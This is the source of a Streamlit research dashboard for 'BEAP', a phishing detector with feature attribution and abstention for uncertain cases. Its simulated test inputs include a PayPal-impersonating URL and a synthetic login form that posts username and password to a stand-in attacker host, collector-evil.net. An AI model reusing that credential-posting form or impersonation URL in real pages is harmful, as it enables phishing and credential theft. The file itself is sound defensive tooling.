"""
BEAP Interactive Dashboard.
Research demo interface for explainable phishing detection and selective abstention.
"""

import os
import sys
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import streamlit as st

# Add workspace to sys.path
sys.path.insert(0, os.path.abspath("."))

from beap.config import DEFAULT_TAU_LOW, DEFAULT_TAU_HIGH
from beap.detector import BEAPDetector
from beap.models import BEAPLogisticRegression, BEAPXGBoost

st.set_page_config(
    page_title="BEAP Phishing Detection System",
    layout="wide"
)

# Minimal, clean professional styling
st.markdown(
    """
    <style>
    /* Hide Streamlit header chrome, toolbar, deploy button, status indicator, and menu */
    #MainMenu { visibility: hidden !important; display: none !important; }
    footer { visibility: hidden !important; display: none !important; }
    header { visibility: hidden !important; height: 0px !important; }
    [data-testid="stToolbar"] { display: none !important; visibility: hidden !important; }
    [data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
    [data-testid="stStatusWidget"] { display: none !important; visibility: hidden !important; }
    .stDeployButton { display: none !important; visibility: hidden !important; }
    [data-testid="stDeployButton"] { display: none !important; visibility: hidden !important; }

    .block-container {
        padding-top: 1.5rem !important;
        padding-bottom: 2rem;
    }
    .status-badge {
        display: inline-block;
        padding: 4px 10px;
        border-radius: 3px;
        font-weight: 600;
        font-size: 13px;
        letter-spacing: 0.5px;
        text-transform: uppercase;
        margin-bottom: 8px;
    }
    .badge-phish {
        background-color: #fee2e2;
        color: #991b1b;
        border: 1px solid #f87171;
    }
    .badge-legit {
        background-color: #dcfce7;
        color: #166534;
        border: 1px solid #86efac;
    }
    .badge-abstain {
        background-color: #fef9c3;
        color: #854d0e;
        border: 1px solid #fde047;
    }
    .metric-container {
        background-color: #f8fafc;
        border: 1px solid #e2e8f0;
        border-radius: 4px;
        padding: 16px;
        margin-bottom: 12px;
    }
    </style>
    """,
    unsafe_allow_html=True
)


@st.cache_resource
def load_trained_detector(model_type: str = "lr", feature_mode: str = "multimodal_full"):
    train_df = pd.read_csv(os.path.join("data", "processed", "train.csv"))
    if model_type == "xgb":
        clf = BEAPXGBoost(n_estimators=80, max_depth=4)
    else:
        clf = BEAPLogisticRegression(C=1.0)

    det = BEAPDetector(classifier=clf, feature_mode=feature_mode, use_memory=True)
    det.fit(train_df, train_df["label"].values.astype(int))
    return det


def main():
    # Header
    st.markdown("### BEAP: Evidence-Augmented Phishing Detection")
    st.caption("Dynamic browser evidence verification with dual-threshold selective abstention.")
    st.markdown("---")

    # Sidebar controls
    st.sidebar.markdown("#### Model Configuration")

    model_choice = st.sidebar.selectbox(
        "Classifier",
        ["Logistic Regression (Linear Attribution)", "XGBoost (TreeSHAP)"]
    )
    model_type = "xgb" if "XGBoost" in model_choice else "lr"

    modality_choice = st.sidebar.selectbox(
        "Input Modalities",
        ["Multimodal (Static + Browser Evidence)", "Static Only (URL + HTML)", "Dynamic Only (Browser Evidence)"]
    )
    if "Static Only" in modality_choice:
        feat_mode = "static_all"
    elif "Dynamic Only" in modality_choice:
        feat_mode = "dynamic_only"
    else:
        feat_mode = "multimodal_full"

    st.sidebar.markdown("#### Selective Abstention")
    delta = st.sidebar.slider(
        "Uncertainty Margin (delta)",
        min_value=0.00,
        max_value=0.45,
        value=0.15,
        step=0.01,
        help="Scores within [0.5 - delta, 0.5 + delta] are deferred for human review."
    )
    tau_low = 0.5 - delta
    tau_high = 0.5 + delta
    st.sidebar.caption(f"Decision thresholds: Accept Legitimate <= {tau_low:.2f} | Flag Phishing >= {tau_high:.2f}")

    detector = load_trained_detector(model_type=model_type, feature_mode=feat_mode)
    detector.abstention_engine.tau_low = tau_low
    detector.abstention_engine.tau_high = tau_high

    # Initialize session state defaults
    if "url_input" not in st.session_state:
        st.session_state.url_input = "https://auth-verification-paypal-notice.xyz/account/login"
    if "hsts" not in st.session_state:
        st.session_state.hsts = False
    if "csp" not in st.session_state:
        st.session_state.csp = False
    if "xfo" not in st.session_state:
        st.session_state.xfo = False
    if "cross_form" not in st.session_state:
        st.session_state.cross_form = True
    if "short_cert" not in st.session_state:
        st.session_state.short_cert = True
    if "reflection" not in st.session_state:
        st.session_state.reflection = True

    # Presets for demonstration
    st.markdown("##### Test Scenarios")
    preset_col1, preset_col2, preset_col3 = st.columns(3)

    if preset_col1.button("Sample 1: Brand Impersonation (Phishing)", use_container_width=True):
        st.session_state.url_input = "https://auth-verification-paypal-notice.xyz/account/login"
        st.session_state.hsts = False
        st.session_state.csp = False
        st.session_state.xfo = False
        st.session_state.cross_form = True
        st.session_state.short_cert = True
        st.session_state.reflection = True
        st.rerun()

    if preset_col2.button("Sample 2: Banking Portal (Legitimate)", use_container_width=True):
        st.session_state.url_input = "https://portal.chase.com/auth/login?verify=true"
        st.session_state.hsts = True
        st.session_state.csp = True
        st.session_state.xfo = True
        st.session_state.cross_form = False
        st.session_state.short_cert = False
        st.session_state.reflection = False
        st.rerun()

    if preset_col3.button("Sample 3: Inconclusive Telemetry (Abstain)", use_container_width=True):
        st.session_state.url_input = "https://univ-portal-99.edu/support/help"
        st.session_state.hsts = False
        st.session_state.csp = False
        st.session_state.xfo = False
        st.session_state.cross_form = False
        st.session_state.short_cert = False
        st.session_state.reflection = False
        st.rerun()

    url_input = st.text_input("Target URL", value=st.session_state.url_input)
    st.session_state.url_input = url_input

    # Dynamic evidence inputs
    with st.expander("Browser Telemetry Parameters (Simulated Probe)", expanded=False):
        col_h1, col_h2, col_h3 = st.columns(3)
        hsts_checked = col_h1.checkbox("Strict-Transport-Security (HSTS)", value=st.session_state.hsts)
        csp_checked = col_h2.checkbox("Content-Security-Policy (CSP)", value=st.session_state.csp)
        xfo_checked = col_h3.checkbox("X-Frame-Options (DENY/SAMEORIGIN)", value=st.session_state.xfo)

        col_b1, col_b2, col_b3 = st.columns(3)
        cross_form = col_b1.checkbox("Cross-Domain Form Target", value=st.session_state.cross_form)
        short_cert = col_b2.checkbox("Short-Lived TLS Cert (<=90 days)", value=st.session_state.short_cert)
        reflection = col_b3.checkbox("Unsanitized Probe Reflection", value=st.session_state.reflection)

        st.session_state.hsts = hsts_checked
        st.session_state.csp = csp_checked
        st.session_state.xfo = xfo_checked
        st.session_state.cross_form = cross_form
        st.session_state.short_cert = short_cert
        st.session_state.reflection = reflection

    headers = {}
    if hsts_checked:
        headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload"
    if csp_checked:
        headers["Content-Security-Policy"] = "default-src 'self'; form-action 'self';"
    if xfo_checked:
        headers["X-Frame-Options"] = "DENY"
    headers["X-Content-Type-Options"] = "nosniff"

    tls_info = {
        "cert_valid": True,
        "longevity_days": 45.0 if short_cert else 365.0,
        "issuer_name": "Let's Encrypt Authority X3" if short_cert else "DigiCert Global Root"
    }

    form_action = "https://collector-evil.net/post" if cross_form else "/auth/login_submit"
    html_content = f"""
    <html><head><title>Authentication Portal</title></head>
    <body><form action="{form_action}" method="POST">
    <input type="text" name="user" /><input type="password" name="password" />
    <button type="submit">Submit</button></form>
    {'<!--beap_xss_probe_918273-->' if reflection else ''}
    </body></html>
    """

    analyze_btn = st.button("Inspect Target", type="primary", use_container_width=True)

    # State signature for automatic analysis synchronization
    state_signature = (
        url_input,
        hsts_checked,
        csp_checked,
        xfo_checked,
        cross_form,
        short_cert,
        reflection,
        model_type,
        feat_mode,
        tau_low,
        tau_high
    )

    if analyze_btn or "last_sig" not in st.session_state or st.session_state.last_sig != state_signature:
        pred, rep = detector.inspect_url(
            url=url_input,
            html_content=html_content,
            headers=headers,
            tls_info=tls_info
        )
        st.session_state.current_pred = pred
        st.session_state.current_rep = rep
        st.session_state.last_sig = state_signature

    if "current_rep" in st.session_state:
        rep = st.session_state.current_rep

        st.markdown("---")

        # Layout: Verdict Summary (Left) & Diagnostics (Right)
        res_col1, res_col2 = st.columns([1, 2])

        with res_col1:
            st.markdown("##### Verdict")

            if rep.verdict == "PHISHING":
                st.markdown('<div class="status-badge badge-phish">Verdict: Phishing</div>', unsafe_allow_html=True)
            elif rep.verdict == "LEGITIMATE":
                st.markdown('<div class="status-badge badge-legit">Verdict: Legitimate</div>', unsafe_allow_html=True)
            else:
                st.markdown('<div class="status-badge badge-abstain">Verdict: Uncertain (Abstained)</div>', unsafe_allow_html=True)

            st.metric(label="Estimated Phishing Probability", value=f"{rep.phishing_probability:.1%}")

            if rep.abstained:
                st.caption(f"**Abstention Reason:** {rep.abstention_reason}")

            st.markdown(f"**Recommended Action:**\n{rep.action_recommendation}")

        with res_col2:
            st.markdown("##### Diagnostic Details")
            tab_signals, tab_headers, tab_metrics, tab_arch = st.tabs([
                "Feature Attribution",
                "Browser Telemetry",
                "Evaluation Metrics",
                "System Architecture"
            ])

            with tab_signals:
                signals = []
                if rep.top_risk_signals:
                    for s in rep.top_risk_signals[:4]:
                        signals.append((s.feature_name.replace("_", " "), s.attribution_weight, "#991b1b"))
                if rep.top_trust_signals:
                    for s in rep.top_trust_signals[:4]:
                        signals.append((s.feature_name.replace("_", " "), s.attribution_weight, "#166534"))

                if signals:
                    signals.sort(key=lambda x: x[1])
                    fig, ax = plt.subplots(figsize=(7.5, 3.0))
                    ax.axvline(0, color="#64748b", linewidth=0.8, linestyle="--")
                    ax.barh([s[0] for s in signals], [s[1] for s in signals], color=[s[2] for s in signals], alpha=0.85)
                    ax.set_xlabel("Attribution Contribution (<- Legitimate | Phishing ->)", fontsize=9)
                    ax.set_title("Local Feature Contribution", fontsize=10)
                    ax.grid(axis="x", linestyle=":", alpha=0.5)
                    ax.tick_params(axis='both', which='major', labelsize=8)
                    plt.tight_layout()
                    st.pyplot(fig)
                    plt.close(fig)

                col_sig1, col_sig2 = st.columns(2)
                with col_sig1:
                    st.markdown("**Risk Features (Phishing Tendency)**")
                    if rep.top_risk_signals:
                        for s in rep.top_risk_signals:
                            st.markdown(f"- `{s.feature_name}` (`{s.attribution_weight:+.3f}`): {s.explanation}")
                    else:
                        st.caption("No strong risk signals.")

                with col_sig2:
                    st.markdown("**Trust Features (Legitimate Tendency)**")
                    if rep.top_trust_signals:
                        for s in rep.top_trust_signals:
                            st.markdown(f"- `{s.feature_name}` (`{s.attribution_weight:+.3f}`): {s.explanation}")
                    else:
                        st.caption("No strong trust signals.")

            with tab_headers:
                st.markdown("**Observed Browser Telemetry**")
                th_col1, th_col2 = st.columns(2)
                th_col1.markdown(f"- **HSTS:** {'Enforced' if hsts_checked else 'Not detected'}")
                th_col1.markdown(f"- **Content-Security-Policy:** {'Configured' if csp_checked else 'Not detected'}")
                th_col1.markdown(f"- **X-Frame-Options:** {'Configured' if xfo_checked else 'Not detected'}")
                th_col2.markdown(f"- **Form Exfiltration:** {'Cross-Domain' if cross_form else 'Same-Origin'}")
                th_col2.markdown(f"- **TLS Longevity:** {'<= 90 days' if short_cert else 'Standard (>90 days)'}")
                th_col2.markdown(f"- **Input Probe Reflection:** {'Vulnerability Detected' if reflection else 'Sanitized'}")

            with tab_metrics:
                st.markdown("**Empirical Rejection and ROC Curves**")
                m_col1, m_col2 = st.columns(2)
                rej_path = os.path.join("results", "figures", "rejection_accuracy_curve.png")
                roc_path = os.path.join("results", "figures", "roc_curves.png")
                if os.path.exists(rej_path):
                    m_col1.image(rej_path, caption="Selective Accuracy vs. Coverage")
                if os.path.exists(roc_path):
                    m_col2.image(roc_path, caption="Multimodal ROC Comparison")

            with tab_arch:
                st.markdown("**Framework Design**")
                arch_path = os.path.join("results", "figures", "system_architecture.png")
                if os.path.exists(arch_path):
                    st.image(arch_path, caption="BEAP Pipeline: Static Analysis, Browser Evidence, and Abstention")
                feat_path = os.path.join("results", "figures", "global_feature_importance.png")
                if os.path.exists(feat_path):
                    st.image(feat_path, caption="Global Feature Importance Distribution")


if __name__ == "__main__":
    main()
